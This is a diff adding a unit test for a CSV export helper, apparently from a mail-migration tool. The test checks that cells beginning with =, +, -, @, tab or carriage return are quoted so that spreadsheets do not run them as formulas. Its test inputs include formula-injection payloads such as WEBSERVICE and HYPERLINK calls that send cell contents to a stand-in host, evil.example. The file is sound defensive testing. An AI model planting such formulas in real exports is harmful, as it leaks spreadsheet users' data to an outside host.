@@ -5,6 +5,7 @@ import {
   escapeHtml,
   isBlank,
   isBusy,
+  csvCell,
   linksCsv,
   mergeCsv,
   problemsByRow,
@@ -137,6 +138,35 @@ describe("links", () => {
       'mini@example.com;"Mini ""die Kleine""; Muster";mini@example.net;https://mail.example.com/password/abc;9. Oktober',
       "",
     ]);
+  });
+
+  it("never lets a spreadsheet read a cell as a formula", () => {
+    for (const hostile of ["=HYPERLINK(\"https://evil.example\";D2)", "+1+1", "-2+3", "@SUM(A1)", "\tx", "\rx"]) {
+      const out = csvCell(hostile);
+      expect(out.startsWith(`"'`)).toBe(true);
+      expect(out.endsWith('"')).toBe(true);
+    }
+    expect(csvCell("=1;2")).toBe(`"'=1;2"`);
+    expect(csvCell("Mini")).toBe("Mini");
+    expect(csvCell("mini-muster@example.com")).toBe("mini-muster@example.com");
+    const csv = linksCsv(
+      [
+        {
+          mailboxId: 1,
+          address: "=cmd@example.com",
+          name: "=WEBSERVICE(\"https://evil.example/\"&D2)",
+          oldAddress: "+old@example.net",
+          path: "/password/abc",
+          expiresAt: 0,
+        },
+      ],
+      "https://mail.example.com",
+      ["Postfach", "Name", "Alte Adresse", "Link", "Gültig bis"],
+      () => "9. Oktober",
+    );
+    expect(csv.slice(1).split("\r\n")[1]).toBe(
+      `"'=cmd@example.com";"'=WEBSERVICE(""https://evil.example/""&D2)";"'+old@example.net";https://mail.example.com/password/abc;9. Oktober`,
+    );
   });
 
   it("escapes text for the printed page", () => {
